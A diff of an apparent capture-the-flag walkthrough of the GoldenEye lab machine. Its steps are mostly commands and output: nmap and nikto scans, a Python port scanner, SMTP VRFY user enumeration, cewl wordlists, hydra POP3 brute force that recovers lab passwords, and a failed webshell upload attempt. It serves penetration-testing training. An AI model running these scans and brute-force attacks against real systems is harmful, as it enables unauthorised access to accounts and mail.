@@ -1,14 +1,15 @@
+[*]
 1. find host: nmap -sn 172.16.16.0/24
 MAC Address: 08:00:27:9B:DA:D7 (Oracle VirtualBox virtual NIC)
 Nmap scan report for 172.16.16.44
 Host is up (0.00027s latency).
-
+[*]
 2. Generic scan: nmap 172.16.16.44
 Not shown: 998 closed ports
 PORT   STATE SERVICE
 25/tcp open  smtp
 80/tcp open  http
-
+[*]
 3. Service scan: nmap 172.16.16.44 -A -sV -p 25,80
 PORT   STATE SERVICE VERSION
 25/tcp open  smtp    Postfix smtpd
@@ -18,7 +19,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: GoldenEye Primary Admin Server
 MAC Address: 08:00:27:D5:65:0B (Oracle VirtualBox virtual NIC)
-
+[*]
 4. Webserver scanning:
 root@hostmachine:~# nikto -h 172.16.16.44
 - Nikto v2.1.6
@@ -41,7 +42,7 @@ root@hostmachine:~# nikto -h 172.16.16.44
 + OSVDB-3233: /icons/README: Apache default file found.
 + 7889 requests: 0 error(s) and 9 item(s) reported on remote host
 + End Time:           2020-06-14 19:31:32 (GMT-5) (48 seconds)
-
+[*]
 5. Found possible vulns
 root@hostmachine:~# searchsploit "Cobalt Qube"
 ------------------------------------------------------------------------------ ---------------------------------
@@ -49,24 +50,24 @@ root@hostmachine:~# searchsploit "Cobalt Qube"
 ------------------------------------------------------------------------------ ---------------------------------
 Cobalt Qube 3.0 - Authentication Bypass                                       | php/webapps/21640.txt
 Cobalt Qube Webmail 1.0 - Directory Traversal                                 | php/webapps/20995.txt
-
+[*]
 6. Attempted exploit for CobaltQute 3.0, but no luck
-
+[*]
 7. Found artifact in terminal.js
 view-source:http://172.16.16.44/terminal.js
 //
 //I encoded you p@ssword below...
 //
 //&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
-
+[*]
 8. Using cyber chef (from html) I was able to decode the password:
 InvincibleHack3r
-
+[*]
 9. Login to /sev-login and login as boris
-
+[*]
 10. Found artifact
 Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
-
+[*]
 11. I used a quick script to scan all ports in under 10sec
 from multiprocessing import Pool
 import socket
@@ -86,7 +87,7 @@ pool.map(scan, ports)
 80
 55006
 55007
-
+[*]
 12. Enumerate ports:
 
 PORT      STATE SERVICE     VERSION
@@ -96,10 +97,10 @@ PORT      STATE SERVICE     VERSION
 |_pop3-capabilities: TOP RESP-CODES STLS SASL(PLAIN) AUTH-RESP-CODE USER UIDL PIPELINING CAPA
 |_ssl-date: TLS randomness does not represent time
 
-
+[*]
 13. VRFY is set for SMTP, so I'm going to make a user list from splashAdmin.php
 cewl -d 2 -m 4 http://172.16.16.44/splashAdmin.php -w gold_users.txt
-
+[*]
 14. Used python script to add lowercase words to user list:
 with open('gold_users.txt', 'r') as f:
   file = f.read()
@@ -109,14 +110,14 @@ for u in file:
     file.append(u.lower())
 with open('gold_users.txt', 'w') as f:
   f.write('\n'.join(str(v) for v in file))
-
+[*]
 15. Used a 'vrfy' script to check mail server against known users // user enumeration
 252 2.0.0 Boris
 252 2.0.0 Natalya
 252 2.0.0 boris
 252 2.0.0 natalya
 252 2.0.0 root
-
+[*]
 16. Quick bruteforce: hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -s 55007 pop3://172.16.16.44
 users.txt:
 boris
@@ -127,7 +128,7 @@ root
 [55007][pop3] host: 172.16.16.44   login: boris   password: secret1!
 [STATUS] 79.67 tries/min, 239 tries in 00:03h, 427 to do in 00:06h, 16 active
 [55007][pop3] host: 172.16.16.44   login: natalya   password: bird
-
+[*]
 17. Enumerate boris
 From: root@127.0.0.1.goldeneye
 
@@ -147,7 +148,7 @@ Once Xenia gets access to the training site and becomes familiar with the Golden
 
 PS - Keep security tight or we will be compromised.
 
-
+[*]
 18. Enumerate nalalya:
 From: root@ubuntu
 
@@ -169,15 +170,15 @@ And if you didn't have the URL on outr internal Domain: severnaya-station.com/gn
 
 Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
 
-
+[*]
 19. Login as xenia at severnaya-station.com/gnocertdir
-
+[*]
 20. I saw an upload option under profile. I tried to upload a webshell
 http://severnaya-station.com/gnocertdir/user/files.php
-
+[*]
 21. The files don't get evaluated as PHP, so the webshell wasn't successful
 
-
+[*]
 22. Found message from 'doak'
 As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
 
@@ -203,12 +204,12 @@ Please Recycle before you print, Stay Green aka save the company money!
 "There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
 "You miss 100% of the shots you don't shoot at" - Wayne G.
 THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.
-
+[*]
 23. Bruteforce doak's email: hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://172.16.16.44 -s 55007
 [STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
 
 [55007][pop3] host: 172.16.16.44   login: doak   password: goat
-
+[*]
 24. Enumerate doak
 From: doak@ubuntu
 
